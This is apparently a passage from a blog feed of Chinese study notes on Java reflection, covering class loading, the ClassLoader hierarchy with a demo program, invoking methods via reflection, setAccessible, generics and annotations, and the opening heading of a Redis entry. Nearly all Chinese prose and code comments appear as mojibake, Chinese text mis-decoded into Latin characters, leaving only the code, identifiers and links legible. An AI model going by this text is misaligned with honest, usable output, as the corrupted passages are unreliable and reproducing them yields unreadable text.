<li>è¿˜å¯ä»¥åˆ©ç”¨ Classloaderã€‚</li>
</ul>
<blockquote>
<ol start="3">
<li>å“ªäº›ç±»å‹å¯ä»¥æœ‰Classå¯¹è±¡</li>
</ol>
</blockquote>
<ul>
<li>classï¼šå¤–éƒ¨ç±»ï¼Œæˆå‘˜ï¼ˆæˆå‘˜å†…éƒ¨ç±»ï¼Œé™æ€å†…éƒ¨ç±»ï¼‰ï¼Œå±€éƒ¨å†…éƒ¨ç±»ï¼ŒåŒ¿åå†…éƒ¨ç±»ã€‚</li>
<li>interfaceï¼šæ¥å£</li>
<li>[]ï¼šæ•°ç»„</li>
<li>enumï¼šæšä¸¾</li>
<li>annotationï¼šæ³¨è§£@interface </li>
<li>primitive typeï¼šåŸºæœ¬æ•°æ®ç±»å‹</li>
<li>void</li>
</ul>
<h4 id="3-ç±»çš„åŠ è½½ä¸ClassLoader"><a href="#3-ç±»çš„åŠ è½½ä¸ClassLoader" class="headerlink" title="3.ç±»çš„åŠ è½½ä¸ClassLoader"></a>3.ç±»çš„åŠ è½½ä¸ClassLoader</h4><blockquote>
<ol>
<li>Javaå†…å­˜åˆ†æ</li>
</ol>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/9738ef9679770afe7f810b8b1ec303a3--f08b--image-20241006203545571.png" alt="image-20241006203545571"></p>
<blockquote>
<ol start="2">
<li>ç±»çš„åŠ è½½</li>
</ol>
</blockquote>
<ul>
<li>å½“ç¨‹åºä¸»åŠ¨ä½¿ç”¨æŸä¸ªç±»æ—¶ï¼Œå¦‚æœè¯¥ç±»è¿˜æœªè¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œåˆ™ç³»ç»Ÿä¼šé€šè¿‡å¦‚ä¸‹ä¸‰ä¸ªæ­¥éª¤æ¥å¯¹è¯¥ç±»è¿›è¡Œåˆå§‹åŒ–ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/248f7b6bdbcc58f556d8a006ec4fd36b--6c52--image-20241006203555990.png" alt="image-20241006203555990"></p>
<ul>
<li>åŠ è½½ï¼šå°† classæ–‡ä»¶å­—èŠ‚ç å…§å®¹åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶å°†è¿™äº›é™æ€æ•°æ®è½¬æ¢æˆæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„ java. lang . Classå¯¹è±¡ã€‚</li>
<li>é“¾æ¥ï¼šå°†Javaç±»çš„äºŒè¿›åˆ¶ä»£ç åˆå¹¶åˆ°JVMçš„è¿è¡ŒçŠ¶æ€ä¹‹ä¸­çš„è¿‡ç¨‹ã€‚<ul>
<li>éªŒè¯ï¼šç¡®ä¿åŠ è½½çš„ç±»ä¿¡æ¯ç¬¦åˆJVMè§„èŒƒï¼Œæ²¡æœ‰å®‰å…¨æ–¹é¢çš„é—®é¢˜ã€‚</li>
<li>å‡†å¤‡ï¼šæ­£å¼ä¸ºç±»å˜é‡ï¼ˆ staticï¼‰åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡é»˜è®¤åˆå§‹å€¼çš„é˜¶æ®µï¼Œè¿™äº›å†…å­˜éƒ½å°†åœ¨æ–¹æ³•åŒºä¸­è¿›è¡Œåˆ†é…ã€‚</li>
<li>è§£æï¼šè™šæ‹Ÿæœºå¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨ï¼ˆå¸¸é‡åï¼‰æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨ï¼ˆåœ°å€ï¼‰çš„è¿‡ç¨‹ã€‚</li>
</ul>
</li>
<li>åˆå§‹åŒ–ï¼š<ul>
<li>æ‰§è¡Œç±»æ„é€ å™¨&lt; clinit&gt;æ–¹æ³•çš„è¿‡ç¨‹ã€‚ç±»æ„é€ å™¨&lt; clinit&gt;æ–¹æ³•æ˜¯ç”±ç¼–è¯‘æœŸè‡ªåŠ¨æ”¶é›†ç±»ä¸­æ‰€æœ‰ç±»å˜é‡çš„èµ‹å€¼åŠ¨ä½œå’Œé™æ€ä»£ç å—ä¸­çš„è¯­å¥åˆå¹¶äº§ç”Ÿçš„ã€‚ï¼ˆç±»æ„é€ å™¨æ˜¯æ„é€ ç±»ä¿¡æ¯çš„ï¼Œä¸æ˜¯æ„é€ è¯¥ç±»å¯¹è±¡çš„æ„é€ å™¨ï¼‰ã€‚</li>
<li>å½“åˆå§‹åŒ–ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°å…¶çˆ¶ç±»è¿˜æ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶çˆ¶ç±»çš„åˆå§‹åŒ–ã€‚</li>
<li>è™›æ‹Ÿæœºä¼šä¿è¯ä¸€ä¸ªç±»çš„&lt; clinit &gt;()æ–¹æ³•åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­è¢«æ­£ç¡®åŠ é”å’ŒåŒæ­¥ã€‚</li>
</ul>
</li>
<li><a href="https://blog.csdn.net/m0_38075425/article/details/81627349">æ·±åˆ»ç†è§£ç±»åŠ è½½</a></li>
</ul>
<blockquote>
<ol start="3">
<li>ä»€ä¹ˆæ—¶å€™ä¼šå‘ç”Ÿç±»åˆå§‹åŒ–</li>
</ol>
</blockquote>
<ul>
<li>ç±»çš„ä¸»åŠ¨å¼•ç”¨ï¼ˆä¸€å®šä¼šå‘ç”Ÿç±»çš„åˆå§‹åŒ–ï¼‰<ul>
<li>å½“è™šæ‹Ÿæœºå¯åŠ¨ï¼Œå…ˆåˆå§‹åŒ–mainæ–¹æ³•æ‰€åœ¨çš„ç±»ï¼›</li>
<li>newä¸€ä¸ªç±»çš„å¯¹è±¡ï¼›</li>
<li>è°ƒç”¨ç±»çš„é™æ€æˆå‘˜ï¼ˆé™¤äº†finaå¸¸é‡ï¼‰å’Œé™æ€æ–¹æ³•ï¼›</li>
<li>ä½¿ç”¨ java. lang. reflectåŒ…çš„æ–¹æ³•å¯¹ç±»è¿›è¡Œåå°„è°ƒç”¨ï¼›</li>
<li>å½“åˆå§‹åŒ–ä¸€ä¸ªç±»ï¼Œå¦‚æœå…¶çˆ¶ç±»æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œåˆ™å…ˆä¼šåˆå§‹åŒ–å®ƒçš„çˆ¶ç±»ã€‚</li>
</ul>
</li>
<li>ç±»çš„è¢«åŠ¨å¼•ç”¨ï¼ˆä¸ä¼šå‘ç”Ÿç±»çš„åˆå§‹åŒ–ï¼‰<ul>
<li>å½“è®¿é—®ä¸€ä¸ªé™æ€åŸŸæ—¶ï¼Œåªæœ‰çœŸæ­£å£°æ˜è¿™ä¸ªåŸŸçš„ç±»æ‰ä¼šè¢«åˆå§‹åŒ–ã€‚å¦‚ï¼šå½“é€šè¿‡å­ç±»å¼•ç”¨çˆ¶ç±»çš„é™æ€å˜é‡ï¼Œä¸ä¼šå¯¼è‡´å­ç±»åˆå§‹åŒ–ï¼›</li>
<li>é€šè¿‡æ•°ç»„å®šä¹‰ç±»å¼•ç”¨ï¼Œä¸ä¼šè§¦å‘æ­¤ç±»çš„åˆå§‹åŒ–ï¼›</li>
<li>å¼•ç”¨å¸¸é‡ä¸ä¼šè§¦å‘æ­¤ç±»çš„åˆå§‹åŒ–ï¼ˆå¸¸é‡åœ¨é“¾æ¥é˜¶æ®µå°±å­˜å…¥è°ƒç”¨ç±»çš„å¸¸é‡æ± ä¸­äº†ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<ol start="4">
<li>ç±»åŠ è½½å™¨çš„ä½œç”¨</li>
</ol>
</blockquote>
<ul>
<li>ç±»åŠ è½½çš„ä½œç”¨ï¼šå°† classæ–‡ä»¶å­—èŠ‚ç å†…å®¹åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶å°†è¿™äº›é™æ€æ•°æ®è½¬æ¢æˆæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„ï¼Œç„¶ååœ¨å †ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„ java. lang Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºä¸­ç±»æ•°æ®çš„è®¿é—®å…¥å£ã€‚</li>
<li>ç±»ç¼“å­˜ï¼šæ ‡å‡†çš„ JavaSEç±»åŠ è½½å™¨å¯ä»¥æŒ‰è¦æ±‚æŸ¥æ‰¾ç±»ï¼Œä½†ä¸€æ—¦æŸä¸ªç±»è¢«åŠ è½½åˆ°ç±»åŠ è½½å™¨ä¸­ï¼Œå®ƒå°†ç»´æŒåŠ è½½ï¼ˆç¼“å­˜ï¼‰ä¸€æ®µæ—¶é—´ã€‚ä¸è¿‡JVMåƒåœ¾å›æ”¶æœºåˆ¶å¯ä»¥å›æ”¶è¿™äº› Classå¯¹è±¡</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/9281b634c599b8c2edfac30cb2009a79--e49a--image-20241006203627642.png" alt="image-20241006203627642"></p>
<ul>
<li>ç±»åŠ è½½å™¨ä½œç”¨æ˜¯ç”¨æ¥æŠŠç±»ï¼ˆÎ±lassï¼‰è£…è½½è¿›å†…å­˜çš„ã€‚JVMè§„èŒƒå®šä¹‰äº†å¦‚ä¸‹ç±»å‹çš„ç±»çš„åŠ è½½å™¨ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/69b06ba5feeee963329165f6c7e8fae8--1373--image-20241006203652024.png" alt="image-20241006203652024"></p>
<ul>
<li>ClassLoader systemClassLoader &#x3D; ClassLoader.getSystemClassLoader();&#x2F;&#x2F;è·å–ç³»ç»Ÿç±»çš„åŠ è½½å™¨</li>
<li>ClassLoader parent &#x3D; systemClassLoader.getParent();&#x2F;&#x2F;è·å–ç³»ç»Ÿç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨â€“&gt;æ‰©å±•ç±»åŠ è½½å™¨ jre1.8.0_91\lib\ext</li>
<li>ClassLoader parent1 &#x3D; parent.getParent();&#x2F;&#x2F;è·å–æ‰©å±•ç±»åŠ è½½å™¨çˆ¶ç±»åŠ è½½å™¨â€“&gt;æ ¹åŠ è½½å™¨(c&#x2F;c++) jre1.8.0_91\lib\rt.jar</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// è·å–ç³»ç»Ÿç±»çš„åŠ è½½å™¨</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(systemClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å¾—ç³»ç»Ÿç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨ ---&gt; æ‰©å±•ç±»åŠ è½½å™¨   jre1.8.0_91\lib\ext</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> systemClassLoader.getParent();</span><br><span class="line">        System.out.println(parent);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ‰©å±•ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨  --&gt;  æ ¹åŠ è½½å™¨ï¼ˆC/c++ï¼‰jre1.8.0_91\lib\rt.jar</span></span><br><span class="line">        <span class="comment">// è¿”å›nullæ˜¯æ­£å¸¸çš„ï¼Œè¡¨ç¤ºä¸ºæ ¹åŠ è½½å™¨</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent1</span> <span class="operator">=</span> parent.getParent();</span><br><span class="line">        System.out.println(parent1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// æµ‹è¯•å½“å‰ç±»æ˜¯å“ªä¸ªåŠ è½½å™¨å»åŠ è½½çš„</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classDemo1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;ClassDemo1&quot;</span>).getClassLoader();</span><br><span class="line">        System.out.println(classDemo1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æµ‹è¯•JDKå†…ç½®çš„ç±»æ˜¯ä»€ä¹ˆåŠ è½½å™¨åŠ è½½çš„</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>).getClassLoader();</span><br><span class="line">        System.out.println(classLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å¾—ç³»ç»Ÿç±»åŠ è½½å™¨å¯ä»¥åŠ è½½çš„è·¯å¾„</span></span><br><span class="line">        System.out.println(System.getProperty(<span class="string">&quot;java.class.path&quot;</span>));</span><br><span class="line">        <span class="comment">//C:\Program Files\Java\jdk1.8.0_202\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\rt.jar;E:\JavaWeb\JVMDemo\out\production\JVMDemo;C:\Program Files\JetBrains\IntelliJ IDEA 2024.2.0.2\lib\idea_rt.jar</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-è·å–è¿è¡Œç±»çš„å®Œæ•´ç»“æ„"><a href="#4-è·å–è¿è¡Œç±»çš„å®Œæ•´ç»“æ„" class="headerlink" title="4.è·å–è¿è¡Œç±»çš„å®Œæ•´ç»“æ„"></a>4.è·å–è¿è¡Œç±»çš„å®Œæ•´ç»“æ„</h4><ul>
<li><p>é€šè¿‡åå°„è·å–è¿è¡Œæ—¶ç±»çš„å®Œæ•´ç»“æ„</p>
</li>
<li><p>Fieldã€ Methodã€ Constructor.ã€ Superclassã€ Interfaceã€ Annotation</p>
</li>
<li><p>å®ç°çš„å…¨éƒ¨æ¥å£</p>
</li>
<li><p>æ‰€ç»§æ‰¿çš„çˆ¶ç±»</p>
</li>
<li><p>å…¨éƒ¨çš„æ„é€ å™¨</p>
</li>
<li><p>å…¨éƒ¨çš„æ–¹æ³•</p>
</li>
<li><p>å…¨éƒ¨çš„Feld</p>
</li>
<li><p>æ³¨è§£</p>
</li>
<li><p>â€¦â€¦</p>
</li>
<li><p>åœ¨å®é™…çš„æ“ä½œä¸­ï¼Œå–å¾—ç±»çš„ä¿¡æ¯çš„æ“ä½œä»£ç ï¼Œå¹¶ä¸ä¼šç»å¸¸å¼€å‘ã€‚</p>
</li>
<li><p>ä¸€å®šè¦ç†Ÿæ‚‰ java. lang .reflectåŒ…çš„ä½œç”¨ï¼Œåå°„æœºåˆ¶ã€‚</p>
</li>
<li><p>å¦‚ä½•å–å¾—å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨çš„åç§°ï¼Œä¿®é¥°ç¬¦ç­‰ã€‚</p>
</li>
</ul>
<h4 id="5-è°ƒç”¨è¿è¡Œæ—¶ç±»çš„æŒ‡å®šç»“æ„"><a href="#5-è°ƒç”¨è¿è¡Œæ—¶ç±»çš„æŒ‡å®šç»“æ„" class="headerlink" title="5.è°ƒç”¨è¿è¡Œæ—¶ç±»çš„æŒ‡å®šç»“æ„"></a>5.è°ƒç”¨è¿è¡Œæ—¶ç±»çš„æŒ‡å®šç»“æ„</h4><blockquote>
<ol>
<li>æœ‰Classå¯¹è±¡,èƒ½åšä»€ä¹ˆ</li>
</ol>
</blockquote>
<ul>
<li>åˆ›å»ºç±»çš„å¯¹è±¡ï¼šè°ƒç”¨ Classå¯¹è±¡çš„ newInstance()æ–¹æ³•<ul>
<li>1ï¼‰ç±»å¿…é¡»æœ‰ä¸€ä¸ªæ— å‚æ•°çš„æ„é€ å™¨ã€‚</li>
<li>2ï¼‰ç±»çš„æ„é€ å™¨çš„è®¿é—®æƒé™éœ€è¦è¶³å¤Ÿã€‚</li>
</ul>
</li>
<li>æ€è€ƒï¼Ÿéš¾é“æ²¡æœ‰æ— å‚çš„æ„é€ å™¨å°±ä¸èƒ½åˆ›å»ºå¯¹è±¡äº†å—ï¼Ÿåªè¦åœ¨æ“ä½œçš„æ—¶å€™æ˜ç¡®çš„è°ƒç”¨ç±»ä¸­çš„æ„é€ å™¨ï¼Œå¹¶å°†å‚æ•°ä¼ é€’è¿›å»ä¹‹åï¼Œæ‰å¯ä»¥å®ä¾‹åŒ–æ“ä½œã€‚</li>
<li>æ­¥éª¤å¦‚ä¸‹ï¼š<ul>
<li>1ï¼‰é€šè¿‡classç±»çš„ getDeclaredConstructorï¼ˆ Classâ€¦ï¼Œ parameterTypesï¼‰å–å¾—æœ¬ç±»çš„æŒ‡å®šå½¢å‚ç±»å‹çš„æ„é€ å™¨ï¼›</li>
<li>2ï¼‰å‘æ„é€ å™¨çš„å½¢å‚ä¸­ä¼ é€’ä¸€ä¸ªå¯¹è±¡æ•°ç»„è¿›å»ï¼Œé‡Œé¢åŒ…å«äº†æ„é€ å™¨ä¸­æ‰€éœ€çš„å„ä¸ªå‚æ•°ã€‚</li>
<li>3ï¼‰é€šè¿‡ Constructoå®ä¾‹åŒ–å¯¹è±¡</li>
</ul>
</li>
</ul>
<blockquote>
<p>2ã€æ–¹æ³•åŠä½¿ç”¨</p>
</blockquote>
<p>é€šè¿‡åå°„ï¼Œè°ƒç”¨ç±»ä¸­çš„æ–¹æ³•ï¼Œé€šè¿‡ Methodç±»å®Œæˆã€‚</p>
<ul>
<li>â‘ é€šè¿‡Casç±»çš„ getMethodï¼ˆ String name, Classâ€¦ parameterTypesï¼‰æ–¹æ³•å–å¾—ä¸€ä¸ª Methodå¯¹è±¡ï¼Œå¹¶è®¾ç½®æ­¤æ–¹æ³•æ“ä½œæ—¶æ‰€éœ€è¦çš„å‚æ•°ç±»å‹ã€‚</li>
<li>â‘¡ä¹‹åä½¿ç”¨ Object invokeï¼ˆ Object objï¼ŒObject[] argsï¼‰è¿›è¡Œè°ƒç”¨ï¼Œå¹¶å‘æ–¹æ³•ä¸­ä¼ é€’è¦è®¾ç½®çš„obå¯¹è±¡çš„å‚æ•°ä¿¡æ¯ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/7034533d6df0a76a9e47b90fe40965ff--d64e--image-20241007131846399.png" alt="image-20241007131846399"></p>
<blockquote>
<p>è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•ï¼š</p>
</blockquote>
<ul>
<li>Object invokeï¼ˆobject obj, Object. argsï¼‰</li>
<li>Objectå¯¹åº”åŸæ–¹æ³•çš„è¿”å›å€¼ï¼Œè‹¥åŸæ–¹æ³•æ— è¿”å›å€¼ï¼Œæ­¤æ—¶è¿”å›nullï¼›</li>
<li>è‹¥åŸæ–¹æ³•è‹¥ä¸ºé™æ€æ–¹æ³•ï¼Œæ­¤æ—¶å½¢å‚ Object objå¯ä¸ºnullï¼›</li>
<li>è‹¥åŸæ–¹æ³•å½¢å‚åˆ—è¡¨ä¸ºç©ºï¼Œåˆ™ Object[] argsä¸ºnullï¼›</li>
<li>è‹¥åŸæ–¹æ³•å£°æ˜ä¸º privateï¼Œåˆ™éœ€è¦åœ¨è°ƒç”¨æ­¤ invokeï¼ˆï¼‰æ–¹æ³•å‰ï¼Œæ˜¾å¼è°ƒç”¨æ–¹æ³•å¯¹è±¡çš„setAccessibleï¼ˆtrueï¼‰æ–¹æ³•ï¼Œå°†å¯è®¿é—® privateçš„æ–¹æ³•ã€‚</li>
</ul>
<blockquote>
<p>setAccessible </p>
</blockquote>
<ul>
<li>Methodå’Œ Fieldã€ Constructorå¯¹è±¡éƒ½æœ‰ setAccessible()æ–¹æ³•ã€‚</li>
<li>setAccessibleä½œç”¨æ˜¯å¯åŠ¨å’Œç¦ç”¨è®¿é—®å®‰å…¨æ£€æŸ¥çš„å¼€å…³ã€‚</li>
<li>å‚æ•°å€¼ä¸ºtrueåˆ™æŒ‡ç¤ºåå°„çš„å¯¹è±¡åœ¨ä½¿ç”¨æ—¶åº”è¯¥å–æ¶ˆJavaè¯­è¨€è®¿é—®æ£€æŸ»ã€‚<ul>
<li>æé«˜åå°„çš„æ•ˆç‡ã€‚å¦‚æœä»£ç ä¸­å¿…é¡»ç”¨åå°„ï¼Œè€Œè¯¥å¥ä»£ç éœ€è¦é¢‘ç¹çš„è¢«è°ƒç”¨ï¼Œé‚£ä¹ˆè¯·è®¾ç½®ä¸ºtrueï¼›</li>
<li>ä½¿å¾—åŸæœ¬æ— æ³•è®¿é—®çš„ç§æœ‰æˆå‘˜ä¹Ÿå¯ä»¥è®¿é—®ï¼›</li>
</ul>
</li>
<li>å‚æ•°å€¼ä¸ºfalseåˆ™æŒ‡ç¤ºåå°„çš„å¯¹è±¡åº”è¯¥å®æ–½Javaè¯­è¨€è®¿é—®æ£€æŸ¥ã€‚</li>
</ul>
<blockquote>
<ol start="3">
<li>æ€§èƒ½æ£€æµ‹</li>
</ol>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç»è¿‡åå¤æµ‹è¯•å¾—å‡ºç»“è®ºï¼šæ™®é€šæ–¹å¼æ‰§è¡Œæ•ˆç‡ &gt; åå°„å…³é—­æ£€æµ‹æ–¹å¼æ‰§è¡Œæ•ˆç‡ &gt; åå°„æ–¹å¼æ‰§è¡Œæ•ˆç‡</span><br></pre></td></tr></table></figure>

<h4 id="6-åå°„æ“ä½œæ³›å‹"><a href="#6-åå°„æ“ä½œæ³›å‹" class="headerlink" title="6.åå°„æ“ä½œæ³›å‹"></a>6.åå°„æ“ä½œæ³›å‹</h4><ul>
<li>Javaé‡‡ç”¨æ³›å‹æ“¦é™¤çš„æœºåˆ¶æ¥å¼•å…¥æ³›å‹ï¼ŒJavaä¸­çš„æ³›å‹ä»…ä»…æ˜¯ç»™ç¼–è¯‘å™¨javacä½¿ç”¨çš„ï¼Œç¡®ä¿æ•°æ®çš„å®‰å…¨æ€§å’Œå…å»å¼ºåˆ¶ç±»å‹è½¬æ¢é—®é¢˜ï¼Œä½†æ˜¯ï¼Œä¸€æ—¦ç¼–è¯‘å®Œæˆï¼Œæ‰€æœ‰å’Œæ³›å‹æœ‰å…³çš„ç±»å‹å…¨éƒ¨æ“¦é™¤ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ³›å‹ï¼š</span><br><span class="line">Java ä¸­çš„æ³›å‹ä»…ä»…æ˜¯ç»™ç¼–è¯‘å™¨ javac ä½¿ç”¨çš„ï¼Œç¡®ä¿æ•°æ®çš„ å®‰å…¨æ€§å’Œå…å»å¼ºåˆ¶ç±»å‹è½¬æ¢çš„éº»çƒ¦ï¼Œä½†æ˜¯ä¸€æ—¦ç¼–è¯‘å®Œæˆï¼Œæ‰€ æœ‰ä¸æ³›å‹æœ‰å…³çš„ç±»å‹å…¨éƒ¨æ“¦é™¤ã€‚</span><br><span class="line">ä½¿ç”¨æ³›å‹ç›´æ¥è¯»å–æ³›å‹ï¼Œæ˜¯è¯»å–ä¸åˆ°çš„ï¼Œå› ä¸ºåå°„æ˜¯æ“ä½œ åŠ è½½ä»¥åçš„ç±»çš„ã€‚</span><br><span class="line">Java æ–°å¢çš„æ•°æ®ç±»å‹ï¼š</span><br><span class="line">ä¸ºäº†é€šè¿‡åå°„æ“ä½œè¿™äº›ç±»å‹ä»¥è¿åˆå®é™…å¼€å‘çš„éœ€è¦</span><br><span class="line">1) ParameterizedTypeï¼š è¡¨ ç¤º ä¸€ ç§ å‚ æ•° åŒ– çš„ ç±» å‹ ,æ¯” å¦‚Collection&lt;String&gt;,å¯ä»¥è·å– String ä¿¡æ¯</span><br><span class="line">2) GenericArrayTypeï¼šæ³›å‹æ•°ç»„ç±»å‹</span><br><span class="line">3) TypeVariableï¼šå„ç§ç±»å‹å˜é‡çš„å…¬å…±çˆ¶æ¥å£</span><br><span class="line">4) WildcardTypeï¼šä»£è¡¨ä¸€ç§é€šé…ç¬¦ç±»å‹è¡¨è¾¾å¼ï¼Œ æ¯”å¦‚? extends Number,? super Integer (Wildcard æ˜¯ä¸€ä¸ªå•è¯ï¼Œå°±æ˜¯é€šé…ç¬¦)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é‚£ä¹ˆæ³›å‹æ˜¯ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿ</span><br><span class="line"></span><br><span class="line">æ³›å‹ ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯ å¹¿æ³›çš„æ•°æ®ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ä»€ä¹ˆæ•°æ®ç±»å‹éƒ½å¯ä»¥ã€‚</span><br><span class="line">ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬è§åˆ°çš„æ³›å‹å°±æ˜¯è¿™ä¸ªæ ·å­ï¼Œç”¨ T è¡¨ç¤ºã€‚</span><br><span class="line">å¦‚ä¸‹æ‰€ç¤ºï¼Œåœ¨ç±»ååæ–¹ç”³æ˜æ³›å‹ Tï¼Œæ¥ç€å°±å¯ä»¥åœ¨æˆå‘˜å˜é‡ã€æ–¹æ³•ä¸­ä½¿ç”¨æ³›å‹äº†ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="7-åå°„æ“ä½œæ³¨è§£"><a href="#7-åå°„æ“ä½œæ³¨è§£" class="headerlink" title="7.åå°„æ“ä½œæ³¨è§£"></a>7.åå°„æ“ä½œæ³¨è§£</h4><ul>
<li>getAnnotations </li>
<li>getAnntation</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/50328b5e689195ee970a7c76472b1ada--b0a1--image-20241007134552563.png"></p>
<h2 id="JAVA-SEæ€»ç»“"><a href="#JAVA-SEæ€»ç»“" class="headerlink" title="JAVA SEæ€»ç»“"></a>JAVA SEæ€»ç»“</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/fd06ebf085a98d84cd36f4775d52280d--5015--Java%20SE.png" alt="Java SE"></p>
]]></content>
  </entry>
  <entry>
    <title>rediså­¦ä¹ </title>
    <url>/2024/09/17/redis%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>è®°å½•å­¦ä¹ NoSQL  Redis</p>
<span id="more"></span>

<h1 id="ä¸€ã€NoSQLæ¦‚è¿°"><a href="#ä¸€ã€NoSQLæ¦‚è¿°" class="headerlink" title="ä¸€ã€NoSQLæ¦‚è¿°"></a>ä¸€ã€NoSQLæ¦‚è¿°</h1><ul>
<li>NoSQLï¼ŒæŒ‡çš„æ˜¯<strong>éå…³ç³»å‹æ•°æ®åº“</strong>ã€‚NoSQLæœ‰æ—¶ä¹Ÿç§°ä¸ºNot Only SQLçš„ç¼©å†™ï¼Œæ˜¯å¯¹ä¸åŒäºä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ç»Ÿç§°ã€‚</li>
</ul>
<h2 id="1ã€ä¸ºä»€ä¹ˆè¦ç”¨NoSQL"><a href="#1ã€ä¸ºä»€ä¹ˆè¦ç”¨NoSQL" class="headerlink" title="1ã€ä¸ºä»€ä¹ˆè¦ç”¨NoSQL"></a>1ã€ä¸ºä»€ä¹ˆè¦ç”¨NoSQL</h2><blockquote>
<p>1ã€å•æœºmysqlçš„å¹´ä»£</p>
</blockquote>
<ul>
